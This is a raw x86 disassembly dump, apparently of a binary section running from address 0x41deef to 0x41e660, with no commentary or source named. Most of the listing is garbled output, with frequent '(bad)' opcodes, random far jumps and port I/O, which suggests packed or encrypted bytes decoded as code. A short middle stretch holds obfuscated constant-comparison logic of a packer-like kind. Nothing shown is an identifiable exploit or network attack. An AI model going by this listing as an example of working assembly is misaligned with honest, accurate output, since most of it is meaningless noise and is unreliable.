  41deef:	test   al,0xf3
  41def1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41def2:	mov    ch,al
  41def4:	cld    
  41def5:	pop    ss
  41def6:	inc    ebp
  41def7:	dec    esi
  41def8:	fcom   QWORD PTR [esp+esi*2]
  41defb:	dec    eax
  41defc:	out    dx,eax
  41defd:	imul   ebp,ebp,0x4f55e87a
  41df03:	retf   
  41df04:	sub    al,0xe7
  41df06:	push   0x9897f627
  41df0b:	xor    esi,DWORD PTR [esi]
  41df0d:	cmp    al,0x9b
  41df0f:	loope  0x41df2f
  41df11:	(bad)  
  41df13:	fidivr DWORD PTR [esi+0xb9cda6]
  41df19:	cmp    al,0x61
  41df1b:	push   eax
  41df1c:	and    BYTE PTR [ebp-0x52],ch
  41df1f:	fwait
  41df20:	in     al,dx
  41df21:	pop    eax
  41df22:	cmp    esp,DWORD PTR [edi+0x2f]
  41df25:	push   edx
  41df26:	fadd   st,st(4)
  41df28:	sti    
  41df29:	test   al,0x6d
  41df2b:	or     dh,ah
  41df2d:	aas    
  41df2e:	add    al,0x34
  41df30:	outs   dx,DWORD PTR ds:[esi]
  41df31:	mov    ah,0x55
  41df33:	dec    edx
  41df34:	test   eax,0x3de4bd98
  41df39:	push   0x976b04ba
  41df3e:	nop
  41df3f:	mov    cs,WORD PTR [edx+0x64c0bb1c]
  41df45:	or     al,0x64
  41df47:	arpl   WORD PTR [ecx],sp
  41df49:	inc    esi
  41df4a:	mov    cl,0x1c
  41df4c:	popf   
  41df4d:	jmp    0xa1a5:0xef78c035
  41df54:	push   ecx
  41df55:	ret    0x8206
  41df58:	xor    al,0xe4
  41df5a:	aad    0x45
  41df5c:	or     BYTE PTR [eax+0x67],0x8a
  41df60:	hlt    
  41df61:	inc    ebp
  41df62:	outs   dx,BYTE PTR ds:[esi]
  41df63:	and    edx,DWORD PTR [edx+0x28]
  41df66:	cmp    edi,ebx
  41df68:	pop    ebx
  41df69:	pop    ecx
  41df6a:	shl    ebx,cl
  41df6c:	popa   
  41df6d:	or     al,0xa2
  41df6f:	jae    0x41df49
  41df71:	fwait
  41df72:	jp     0x41dfe1
  41df74:	js     0x41dfce
  41df76:	mov    eax,DWORD PTR [ecx+0x2b]
  41df79:	pop    ecx
  41df7a:	aas    
  41df7b:	xchg   edx,eax
  41df7c:	xchg   ebx,eax
  41df7d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41df7f:	gs jns 0x41df2e
  41df82:	and    ebx,DWORD PTR [edx+0x5f]
  41df85:	pop    ds
  41df86:	mov    edx,0x1ef476f6
  41df8b:	push   ecx
  41df8c:	push   ecx
  41df8d:	cmc    
  41df8e:	lods   al,BYTE PTR ds:[esi]
  41df8f:	popa   
  41df90:	or     BYTE PTR [ecx-0x7fa5ac3d],al
  41df96:	xor    DWORD PTR [eax+0x6c],edi
  41df99:	adc    bh,BYTE PTR [ebx-0x36]
  41df9c:	cmp    DWORD PTR [eax],esp
  41df9e:	mov    ah,0x6b
  41dfa0:	mov    cl,0x6a
  41dfa2:	div    ah
  41dfa4:	jo     0x41dfea
  41dfa6:	addr16 sbb ebx,esi
  41dfa9:	shr    BYTE PTR [eax+0x5c],cl
  41dfac:	dec    ebp
  41dfad:	dec    ebp
  41dfae:	push   edx
  41dfaf:	cmp    DWORD PTR [ecx],esp
  41dfb1:	xor    DWORD PTR [esi-0x52f06e72],0x5c
  41dfb8:	into   
  41dfb9:	fisttp DWORD PTR [ebp-0x1b]
  41dfbc:	mov    dh,0x15
  41dfbe:	xlat   BYTE PTR ds:[ebx]
  41dfbf:	mov    dh,0xbe
  41dfc1:	hlt    
  41dfc2:	dec    esp
  41dfc3:	in     eax,dx
  41dfc4:	or     eax,0x7e881a73
  41dfc9:	dec    ebx
  41dfca:	push   ss
  41dfcb:	adc    al,0x3c
  41dfcd:	jmp    0x2169:0xc94bd193
  41dfd4:	cwde   
  41dfd5:	mov    eax,ds:0xe1aa14b2
  41dfda:	imul   ebp,DWORD PTR [eax],0xffffffc4
  41dfdd:	push   0x4c
  41dfdf:	in     eax,0xcc
  41dfe1:	sub    DWORD PTR [ebp+0x36],0xffffffed
  41dfe5:	fisub  WORD PTR [edi+edi*4]
  41dfe8:	(bad)  
  41dfe9:	cli    
  41dfea:	jo     0xedbe7845
  41dff0:	sub    DWORD PTR [ebx],eax
  41dff2:	(bad)  
  41dff3:	push   edx
  41dff4:	cdq    
  41dff5:	mov    dh,dl
  41dff7:	mov    eax,0xe0ec5a0
  41dffc:	fisttp WORD PTR [ebp-0x5e014d67]
  41e002:	daa    
  41e003:	mov    BYTE PTR [ebx+0x0],0x41
  41e007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e008:	jmp    0x41dfdb
  41e00a:	fmul   DWORD PTR [eax]
  41e00c:	lds    ebx,FWORD PTR [eax]
  41e00e:	popa   
  41e00f:	push   es
  41e010:	call   0x2e33:0x54668daf
  41e017:	jmp    0xefea29f8
  41e01c:	cmp    DWORD PTR [ebx-0x2a],edx
  41e01f:	in     al,dx
  41e020:	adc    al,0x41
  41e022:	sbb    BYTE PTR [ebx-0x41],cl
  41e025:	aad    0x52
  41e027:	daa    
  41e028:	stc    
  41e029:	ficomp WORD PTR [ecx+0x78]
  41e02c:	int3   
  41e02d:	mov    ds:0xc018af0c,al
  41e032:	in     eax,dx
  41e033:	jl     0x41dff1
  41e035:	jecxz  0x41dff1
  41e037:	or     al,0x11
  41e039:	out    dx,al
  41e03a:	push   ebx
  41e03b:	(bad)  
  41e03c:	jo     0x41e097
  41e03e:	imul   ebx,DWORD PTR [ebx-0x432049ee],0x788a133f
  41e048:	jmp    0x2b7f7ebc
  41e04d:	inc    ebx
  41e04e:	iret   
  41e04f:	pop    esp
  41e050:	sti    
  41e051:	ret    0x43e4
  41e054:	mov    cl,0x3c
  41e056:	enter  0x4a1b,0xbf
  41e05a:	mov    eax,0x41f57e
  41e05f:	rcr    DWORD PTR [esi],0x1e
  41e062:	add    bl,BYTE PTR [ebx]
  41e064:	adc    ebx,edx
  41e066:	sbb    BYTE PTR [eax],dh
  41e068:	(bad)  
  41e069:	fisttp WORD PTR [esi+eax*2-0x74]
  41e06d:	cwde   
  41e06e:	jo     0x41e013
  41e070:	cmc    
  41e071:	or     BYTE PTR [ebx],dl
  41e073:	cmp    al,0x6f
  41e075:	ficomp WORD PTR [ebx+0x5f]
  41e078:	mov    ds:0xa488671,eax
  41e07d:	or     ebx,DWORD PTR [eax-0x4d]
  41e080:	adc    al,0x33
  41e082:	mov    bh,BYTE PTR [edi]
  41e084:	or     BYTE PTR [edx+0x15659696],bh
  41e08a:	gs test al,0xb4
  41e08d:	adc    al,BYTE PTR [ebx]
  41e08f:	in     eax,dx
  41e090:	stos   BYTE PTR es:[edi],al
  41e091:	add    ecx,DWORD PTR [esi+0x40]
  41e094:	inc    ebx
  41e095:	push   eax
  41e096:	loopne 0x41e0dc
  41e098:	dec    edi
  41e099:	xchg   ebp,eax
  41e09a:	stc    
  41e09b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e09c:	je     0x41e0c3
  41e09e:	pop    ebp
  41e09f:	pusha  
  41e0a0:	jmp    0x41e0d2
  41e0a2:	jmp    0x66ce2f66
  41e0a7:	imul   esi,eax,0x64aad330
  41e0ad:	or     ch,cl
  41e0af:	fild   QWORD PTR ss:[ecx+0x7bfa9079]
  41e0b6:	jmp    0x41e0bd
  41e0b8:	sti    
  41e0b9:	sbb    edi,edx
  41e0bb:	pop    esp
  41e0bc:	(bad)  
  41e0be:	pop    edx
  41e0bf:	(bad)  
  41e0c0:	test   al,0x8
  41e0c2:	es xchg edx,eax
  41e0c4:	push   cs
  41e0c5:	ins    BYTE PTR es:[edi],dx
  41e0c6:	lds    esp,FWORD PTR gs:0x72ef0347
  41e0cd:	mov    ebp,DWORD PTR [edi]
  41e0cf:	mov    cl,0x1e
  41e0d1:	in     eax,dx
  41e0d2:	mov    ecx,0xacb6d33
  41e0d7:	fcmovb st,st(4)
  41e0d9:	and    eax,0x799be76d
  41e0de:	sbb    DWORD PTR [ecx],eax
  41e0e0:	stos   DWORD PTR es:[edi],eax
  41e0e1:	sub    edi,DWORD PTR [eax-0x1b00538a]
  41e0e7:	xor    bh,BYTE PTR [edx-0x51]
  41e0ea:	jnp    0x41e09a
  41e0ec:	mov    bl,BYTE PTR [ecx]
  41e0ee:	popa   
  41e0ef:	jl     0x41e09a
  41e0f1:	push   ebx
  41e0f2:	sbb    BYTE PTR [edi-0x4c2b678a],cl
  41e0f8:	push   cs
  41e0f9:	inc    ebx
  41e0fa:	or     al,0xfd
  41e0fc:	adc    al,0x7b
  41e0fe:	sbb    bl,bh
  41e100:	push   ds
  41e101:	lock stos BYTE PTR es:[edi],al
  41e103:	jge    0x41e141
  41e105:	mov    bl,BYTE PTR [ecx+ebx*1]
  41e108:	xor    al,0x23
  41e10a:	sub    eax,0x9d4143d4
  41e10f:	lods   al,BYTE PTR ds:[esi]
  41e110:	hlt    
  41e111:	xor    DWORD PTR [edx+ebp*8+0x2c87b1b],eax
  41e118:	mov    DWORD PTR [esp+0x10],0x421a
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	mov    ebp,0xc67e101b
  41e1f6:	aas    
  41e1f7:	push   ss
  41e1f8:	sbb    BYTE PTR [edx+edx*1+0x55ee1818],bh
  41e1ff:	jmp    0x41e1fa
  41e201:	retf   0x5a2
  41e204:	shr    BYTE PTR [ecx],1
  41e206:	popa   
  41e207:	imul   esp,DWORD PTR [ecx-0x52],0xffffffad
  41e20b:	int    0x3
  41e20d:	(bad)  
  41e20e:	pusha  
  41e20f:	popa   
  41e210:	xchg   ecx,eax
  41e211:	les    edi,FWORD PTR [ebx-0x23]
  41e214:	xlat   BYTE PTR ds:[ebx]
  41e215:	bnd jae 0x41e288
  41e218:	push   edx
  41e219:	mov    bh,0x13
  41e21b:	add    edx,DWORD PTR [esi+eiz*1+0x4e1c4454]
  41e222:	ret    
  41e223:	mov    WORD PTR [edi+ebx*4+0x12],cs
  41e227:	cmp    ecx,DWORD PTR [eax+0x1d638746]
  41e22d:	push   ss
  41e22e:	or     BYTE PTR [ecx+ebx*1+0x69c53db9],al
  41e235:	jge    0x41e1cb
  41e237:	mov    fs,WORD PTR [edx+ecx*1+0x50]
  41e23b:	mov    eax,0xa0f90e3c
  41e240:	(bad)  
  41e241:	dec    ebx
  41e242:	mov    ebx,0xbdec39fe
  41e247:	add    eax,0xf0986034
  41e24c:	xor    esi,DWORD PTR [ebp-0x7b]
  41e24f:	pop    ss
  41e250:	(bad)  
  41e251:	sbb    DWORD PTR [edi-0x8971331],ebp
  41e257:	adc    al,0x7a
  41e259:	and    al,0x42
  41e25b:	lea    edi,[edx-0x5ce47609]
  41e261:	rcr    DWORD PTR [eax],0xd6
  41e264:	test   BYTE PTR [ebx-0x30],bh
  41e267:	shl    BYTE PTR [esi+ebx*4],0xb5
  41e26b:	push   eax
  41e26c:	jmp    0x21d38fd9
  41e271:	arpl   ax,di
  41e273:	and    eax,0xf3f86f8b
  41e278:	jne    0x41e2ea
  41e27a:	cli    
  41e27b:	gs cdq 
  41e27d:	ins    BYTE PTR es:[edi],dx
  41e27e:	mov    al,0x6c
  41e280:	mov    ?,WORD PTR [edi-0x48]
  41e283:	pop    ecx
  41e284:	mov    esp,ecx
  41e286:	addr16 jg 0x41e239
  41e289:	fst    st(3)
  41e28b:	mov    ds:0xb5f7e7a1,al
  41e290:	jne    0x41e298
  41e292:	mov    dh,0x3b
  41e294:	dec    ecx
  41e295:	xchg   edi,eax
  41e296:	imul   eax,DWORD PTR [ebx],0xffffffcd
  41e299:	push   ss
  41e29a:	pop    ebp
  41e29b:	xchg   BYTE PTR [ebp-0x7510f988],dl
  41e2a1:	ins    DWORD PTR es:[edi],dx
  41e2a2:	arpl   WORD PTR [ecx+edi*8+0x65],dx
  41e2a6:	or     esi,DWORD PTR [esi+eax*1]
  41e2a9:	push   edi
  41e2aa:	push   0xffffff88
  41e2ac:	adc    esp,esi
  41e2ae:	mov    BYTE PTR [esi],al
  41e2b0:	sub    edi,esp
  41e2b2:	xchg   edx,eax
  41e2b3:	imul   ecx,DWORD PTR [esi+0x29],0xffffff88
  41e2b7:	dec    ebx
  41e2b8:	xor    ebp,esi
  41e2ba:	(bad)  
  41e2bb:	(bad)  
  41e2bc:	cmp    eax,DWORD PTR [ecx+0x72]
  41e2bf:	shr    DWORD PTR [esi-0xb],0xbe
  41e2c3:	or     al,0x1d
  41e2c5:	xchg   esi,eax
  41e2c6:	(bad)  
  41e2c7:	ror    ch,cl
  41e2c9:	inc    esp
  41e2ca:	jmp    0x41e254
  41e2cc:	mov    al,ds:0x184a92bc
  41e2d1:	jmp    0x4e92fac2
  41e2d6:	adc    DWORD PTR [eax-0x3f],0x79
  41e2da:	pushf  
  41e2db:	adc    DWORD PTR [ebp+0x18],ebp
  41e2de:	out    0x2a,eax
  41e2e0:	(bad)  
  41e2e1:	xor    bh,al
  41e2e3:	dec    edi
  41e2e4:	mov    cl,0x73
  41e2e6:	sbb    eax,0x91c78198
  41e2eb:	pop    esp
  41e2ec:	stc    
  41e2ed:	add    BYTE PTR [edx],dh
  41e2ef:	cdq    
  41e2f0:	jecxz  0x41e2f1
  41e2f2:	xchg   esp,eax
  41e2f3:	push   edi
  41e2f4:	int3   
  41e2f5:	out    dx,eax
  41e2f6:	mov    gs,WORD PTR [eax-0x1c]
  41e2f9:	xor    eax,DWORD PTR [ebx]
  41e2fb:	out    0xeb,eax
  41e2fd:	stc    
  41e2fe:	jp     0x41e370
  41e300:	stc    
  41e301:	sbb    bh,BYTE PTR [esi+0x1b459f16]
  41e307:	pusha  
  41e308:	enter  0x7f52,0xa5
  41e30c:	fwait
  41e30d:	daa    
  41e30e:	stos   DWORD PTR es:[edi],eax
  41e30f:	xor    BYTE PTR ds:0x2c956e84,0xe6
  41e316:	mov    BYTE PTR [eax-0x466a7ef],ch
  41e31c:	inc    esi
  41e31d:	mov    dh,0xf6
  41e31f:	push   es
  41e320:	arpl   WORD PTR [ebx],bp
  41e322:	add    al,0x85
  41e324:	add    al,0x6e
  41e326:	call   0x54af0649
  41e32b:	outs   dx,BYTE PTR ds:[esi]
  41e32c:	mov    ecx,0x317c60f8
  41e331:	xchg   edi,eax
  41e332:	jl     0x41e35c
  41e334:	sub    eax,0xc10574aa
  41e339:	xchg   ecx,eax
  41e33a:	vmulsd xmm5,xmm2,xmm0
  41e33e:	pop    ebp
  41e33f:	scas   eax,DWORD PTR es:[edi]
  41e340:	inc    ebx
  41e341:	mov    al,0xbf
  41e343:	xor    DWORD PTR [ecx+0x3c],ebp
  41e346:	icebp  
  41e347:	push   ds
  41e348:	add    ecx,DWORD PTR [ecx-0x21]
  41e34b:	call   0xc99d:0xd6a5743d
  41e352:	sub    esp,DWORD PTR [edi-0x2a]
  41e355:	retf   
  41e356:	(bad)  
  41e357:	mov    edi,0xa041f765
  41e35c:	sar    BYTE PTR [eax],cl
  41e35e:	outs   dx,BYTE PTR ds:[esi]
  41e35f:	adc    ebx,DWORD PTR [ebx+esi*4-0x2b8ce799]
  41e366:	jnp    0x41e3ae
  41e368:	outs   dx,BYTE PTR ds:[esi]
  41e369:	sub    edx,DWORD PTR [ebx+0x6]
  41e36c:	into   
  41e36d:	or     al,0xcf
  41e36f:	test   DWORD PTR [ecx],edi
  41e371:	xchg   esp,eax
  41e372:	rol    BYTE PTR ds:0x48726f2c,cl
  41e378:	fsub   QWORD PTR [ebx-0x63474836]
  41e37e:	dec    ecx
  41e37f:	cmc    
  41e380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e381:	xlat   BYTE PTR ds:[ebx]
  41e382:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41e384:	push   ecx
  41e385:	mov    bh,0x45
  41e387:	sbb    DWORD PTR [edx],eax
  41e389:	retf   0x8249
  41e38c:	dec    esi
  41e38d:	retf   
  41e38e:	dec    ecx
  41e38f:	stc    
  41e390:	lds    esi,FWORD PTR [edi+edx*2+0x55]
  41e394:	imul   esi,ecx,0xffffffed
  41e397:	pop    edi
  41e398:	test   al,0x95
  41e39a:	ficomp DWORD PTR [edx]
  41e39c:	ins    BYTE PTR es:[edi],dx
  41e39d:	inc    ebx
  41e39e:	ss cli 
  41e3a0:	adc    ebx,DWORD PTR [edi]
  41e3a2:	mov    esi,0x800e4bd0
  41e3a7:	nop
  41e3a8:	outs   dx,BYTE PTR ds:[esi]
  41e3a9:	rcr    BYTE PTR [esp+ebx*2],cl
  41e3ac:	ret    
  41e3ad:	shl    BYTE PTR [eax],cl
  41e3af:	stos   BYTE PTR es:[edi],al
  41e3b0:	sbb    esi,edx
  41e3b2:	mov    dh,0x37
  41e3b4:	sbb    ebp,DWORD PTR [edx-0x4442556f]
  41e3ba:	loope  0x41e389
  41e3bc:	sub    al,0xa8
  41e3be:	adc    eax,0x52f54b2f
  41e3c3:	sbb    al,0xd7
  41e3c5:	in     eax,dx
  41e3c6:	sar    BYTE PTR ds:0xb07982f0,0x4f
  41e3cd:	out    0x8c,al
  41e3cf:	xchg   ebx,eax
  41e3d0:	scas   al,BYTE PTR es:[edi]
  41e3d1:	dec    edi
  41e3d2:	mov    bl,0xaf
  41e3d4:	repnz push esp
  41e3d6:	pop    ecx
  41e3d7:	push   DWORD PTR [ebp+0x0]
  41e3da:	mov    bh,0x14
  41e3dc:	retw   0xca4e
  41e3e0:	(bad)  
  41e3e2:	or     al,0x46
  41e3e4:	enter  0x4dbb,0x29
  41e3e8:	cwde   
  41e3e9:	lahf   
  41e3ea:	cs add al,0x10
  41e3ed:	and    cl,BYTE PTR [eax+eiz*1-0x5a]
  41e3f1:	fcmove st,st(3)
  41e3f3:	mul    esp
  41e3f5:	sub    BYTE PTR ds:0x227114f6,al
  41e3fb:	lods   eax,DWORD PTR ds:[esi]
  41e3fc:	idiv   cl
  41e3fe:	adc    BYTE PTR [ebp+0x2c9dde7a],0x50
  41e405:	xchg   ecx,eax
  41e406:	loopne 0x41e41b
  41e408:	pop    ss
  41e409:	mov    ah,0x42
  41e40b:	lea    esp,[ebx-0x28]
  41e40e:	(bad)  
  41e40f:	push   ebp
  41e410:	mov    ecx,0xeadcce60
  41e415:	leave  
  41e416:	push   esi
  41e417:	adc    al,0xcf
  41e419:	dec    ecx
  41e41a:	push   ds
  41e41b:	pop    ebx
  41e41c:	mul    DWORD PTR [edx]
  41e41e:	mov    DWORD PTR [ecx-0x5676c32c],esi
  41e424:	lods   eax,DWORD PTR ds:[esi]
  41e425:	in     eax,0x41
  41e427:	cli    
  41e428:	fbld   TBYTE PTR [ebx+0x6402859e]
  41e42e:	cli    
  41e42f:	push   esi
  41e430:	push   0x28
  41e432:	adc    bh,BYTE PTR [edx+0x9]
  41e435:	and    esp,ecx
  41e437:	daa    
  41e438:	mul    BYTE PTR ds:[ebx+0x188c492]
  41e43f:	sar    BYTE PTR [esi+0x15],cl
  41e442:	mov    DWORD PTR [edx-0x71355f6c],ebx
  41e448:	xor    DWORD PTR [esi],ebp
  41e44a:	cmp    BYTE PTR [esi],cl
  41e44c:	inc    ebp
  41e44d:	iret   
  41e44e:	jg     0x41e43b
  41e450:	xchg   ebx,eax
  41e451:	scas   eax,DWORD PTR es:[edi]
  41e452:	ficomp DWORD PTR [ecx]
  41e454:	mov    cl,0x3
  41e456:	retf   0xa260
  41e459:	push   esi
  41e45a:	sub    bh,dl
  41e45c:	lahf   
  41e45d:	mov    al,ds:0xea977412
  41e462:	pop    ebp
  41e463:	daa    
  41e464:	call   0x9d73c7a6
  41e469:	ins    DWORD PTR es:[edi],dx
  41e46a:	mov    ch,0x26
  41e46c:	lea    eax,[ecx]
  41e46e:	jae    0x41e428
  41e470:	adc    dh,BYTE PTR [edi+0x1]
  41e473:	sbb    DWORD PTR [ebx+ecx*8+0x15d07fb1],ecx
  41e47a:	test   DWORD PTR [edx-0x6719518a],esp
  41e480:	adc    eax,0xaee293e0
  41e485:	pop    ds
  41e486:	mov    WORD PTR [edi],cs
  41e488:	inc    esp
  41e489:	or     DWORD PTR [edi+0x38dbf943],0x36fabbee
  41e493:	xor    DWORD PTR [esi-0x4512cd51],ecx
  41e499:	jb     0x41e482
  41e49b:	jmp    0x41e4f7
  41e49d:	rcr    dh,cl
  41e49f:	mov    edx,0x4f80178a
  41e4a4:	in     al,0xaa
  41e4a6:	mov    WORD PTR [edx-0x69],fs
  41e4a9:	mov    bl,0x8e
  41e4ab:	adc    eax,0x75daa18d
  41e4b0:	and    bh,0x9c
  41e4b3:	and    dh,BYTE PTR [esp+ebp*4-0x637730a]
  41e4ba:	arpl   bp,si
  41e4bc:	sub    ecx,ebp
  41e4be:	mov    ds:0xf70694fa,eax
  41e4c3:	out    0x2b,eax
  41e4c5:	(bad)
  41e4c9:	imul   eax,DWORD PTR [esi],0x5d
  41e4cc:	mov    ecx,DWORD PTR [esi-0x12a9e8b]
  41e4d2:	int3   
  41e4d3:	dec    edi
  41e4d4:	fild   QWORD PTR [ebp-0x54]
  41e4d7:	jmp    0x41e4de
  41e4d9:	xor    eax,0xfbc384bb
  41e4de:	pop    esi
  41e4df:	mov    DWORD PTR [edi+esi*2],ecx
  41e4e2:	jmp    0x6929:0x76f95464
  41e4e9:	cmp    BYTE PTR [ecx-0x3d],ch
  41e4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ed:	adc    edi,DWORD PTR [eax-0x1f591ab]
  41e4f3:	add    BYTE PTR [eax],ch
  41e4f5:	in     eax,dx
  41e4f6:	cld    
  41e4f7:	jp     0x41e524
  41e4f9:	nop
  41e4fa:	cmp    ebp,esp
  41e4fc:	(bad)  
  41e4fd:	xor    eax,0x6eeb003d
  41e502:	mov    ecx,0xcdb9274d
  41e507:	retf   0x85d
  41e50a:	inc    eax
  41e50b:	lock inc ebx
  41e50d:	sub    al,0xb2
  41e50f:	adc    eax,0xe6c21c74
  41e514:	imul   edi,DWORD PTR [ecx+0x773a645e],0x28b4a76c
  41e51e:	mov    bl,0xca
  41e520:	sub    ecx,DWORD PTR [ebx+esi*1]
  41e523:	add    al,0x26
  41e525:	int3   
  41e526:	inc    edi
  41e527:	pop    edi
  41e528:	xor    ebp,DWORD PTR [eax-0x3abb295c]
  41e52e:	cdq    
  41e52f:	inc    edx
  41e530:	ins    DWORD PTR es:[edi],dx
  41e531:	xor    BYTE PTR [ecx],al
  41e533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e534:	xor    ecx,ecx
  41e536:	popf   
  41e537:	daa    
  41e538:	out    dx,eax
  41e539:	fsubp  st(1),st
  41e53b:	mul    esp
  41e53d:	mov    al,ds:0x836fd74f
  41e542:	mov    ds:0xaeaa8f92,al
  41e547:	mov    ds:0x771565b5,eax
  41e54c:	icebp  
  41e54d:	or     BYTE PTR [edx+esi*1+0x24],bh
  41e551:	jno    0x41e5bd
  41e553:	pop    edx
  41e554:	call   0x5185bd63
  41e559:	sub    eax,0x66af6f46
  41e55e:	ins    DWORD PTR es:[edi],dx
  41e55f:	in     al,0xa8
  41e561:	xor    DWORD PTR [edx+0x38b95c42],ebx
  41e567:	adc    eax,0xe7af68ae
  41e56c:	dec    edi
  41e56d:	div    BYTE PTR [eax]
  41e56f:	jmp    0xc732:0xbec9642b
  41e576:	cmp    al,0xca
  41e578:	adc    al,0xae
  41e57a:	push   esi
  41e57b:	mov    ch,0xb5
  41e57d:	aaa    
  41e57e:	push   esi
  41e57f:	adc    BYTE PTR [edx],cl
  41e581:	test   eax,0x62a19211
  41e586:	pop    esp
  41e587:	popf   
  41e588:	das    
  41e589:	bswap  ecx
  41e58b:	pop    ds
  41e58c:	in     al,0xd0
  41e58e:	ins    BYTE PTR es:[edi],dx
  41e58f:	and    dh,dl
  41e591:	jne    0x41e5ce
  41e593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e594:	push   eax
  41e595:	cmp    DWORD PTR [edx-0x416766fc],ebp
  41e59b:	pushf  
  41e59c:	inc    ebx
  41e59d:	push   ebp
  41e59e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e59f:	lods   al,BYTE PTR ds:[esi]
  41e5a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a1:	fwait
  41e5a2:	shl    DWORD PTR [ebp+0x51f5ef25],1
  41e5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a9:	(bad)  
  41e5aa:	cwde   
  41e5ab:	test   edx,ebp
  41e5ad:	push   edi
  41e5ae:	push   cs
  41e5af:	shl    eax,0x2
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0xc0aae715
  41e5c6:	stc    
  41e5c7:	add    ch,BYTE PTR [edx+0x6b]
  41e5ca:	aaa    
  41e5cb:	push   ss
  41e5cc:	sbb    BYTE PTR [edx+edx*1+0x60df1818],bh
  41e5d3:	leave  
  41e5d4:	sub    cl,al
  41e5d6:	add    DWORD PTR [edi],0x5646cfad
  41e5dc:	mov    eax,0xf771a20a
  41e5e1:	inc    esp
  41e5e2:	fidiv  DWORD PTR [edx+0x7cc83589]
  41e5e8:	fwait
  41e5e9:	dec    ebx
  41e5ea:	mov    edi,0xa99edf3d
  41e5ef:	neg    BYTE PTR [edi]
  41e5f1:	jp     0x41e5ed
  41e5f3:	rcr    DWORD PTR [edi],0xed
  41e5f6:	pop    edx
  41e5f7:	loop   0x41e65f
  41e5f9:	xchg   esp,eax
  41e5fa:	addr16 push esp
  41e5fc:	jmp    0x41e5b4
  41e5fe:	push   cs
  41e5ff:	popf   
  41e600:	stos   BYTE PTR es:[edi],al
  41e601:	inc    ebp
  41e602:	mov    bl,0x7d
  41e604:	das    
  41e605:	dec    ecx
  41e606:	addr16 push 0xbe13ebaa
  41e60c:	mov    eax,0x2d36b59f
  41e611:	in     al,0x87
  41e613:	test   ah,al
  41e615:	sbb    cl,BYTE PTR [ebx]
  41e617:	inc    esi
  41e618:	dec    eax
  41e619:	mov    ebx,DWORD PTR [ebx]
  41e61b:	push   ecx
  41e61c:	cmp    DWORD PTR [ecx-0x26],esp
  41e61f:	fstp   TBYTE PTR [ebx]
  41e621:	push   ds
  41e622:	in     eax,dx
  41e623:	adc    eax,0x9c5d9548
  41e628:	es cmp eax,0x8f50f20
  41e62e:	loope  0x41e5c2
  41e630:	lods   al,BYTE PTR ds:[esi]
  41e631:	push   ebp
  41e632:	sahf   
  41e633:	or     DWORD PTR [edi+0x699c6603],ebx
  41e639:	mov    ecx,0x876613a5
  41e63e:	and    eax,0x8e0b89c9
  41e643:	jmp    0x46c2:0x1fa2419f
  41e64a:	iret   
  41e64b:	es mov al,0x12
  41e64e:	jnp    0x41e6ad
  41e650:	lahf   
  41e651:	loopne 0x41e622
  41e653:	lds    ebp,FWORD PTR [edi]
  41e655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e656:	loope  0x41e61a
  41e658:	cwde   
  41e659:	dec    eax
  41e65a:	jmp    0x41e6c4
  41e65c:	ror    edi,1
  41e65e:	scas   al,BYTE PTR es:[edi]
  41e65f:	push   esp
  41e660:	retf   
